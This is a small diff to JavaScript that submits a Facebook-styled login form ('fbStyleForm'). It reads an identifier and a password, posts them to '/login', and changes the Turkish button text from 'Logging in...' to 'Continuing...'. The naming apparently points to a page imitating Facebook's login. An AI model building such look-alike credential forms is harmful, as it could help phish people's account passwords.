@@ -323,9 +323,9 @@ if (fbStyleForm) {
         const identifier = fbStyleForm.querySelector('input[name="identifier"]').value.trim();
         const password = fbStyleForm.querySelector('input[name="password"]').value.trim();
         if (!identifier || !password) return;
-        const btn = fbStyleForm.querySelector('.fb-login-button');
+        const btn = fbStyleForm.querySelector('.fb-continue-button');
         const original = btn.textContent;
-        btn.textContent = 'Giriş yapılıyor...';
+        btn.textContent = 'Devam ediliyor...';
         btn.disabled = true;
         try {
             const response = await fetch('/login', {
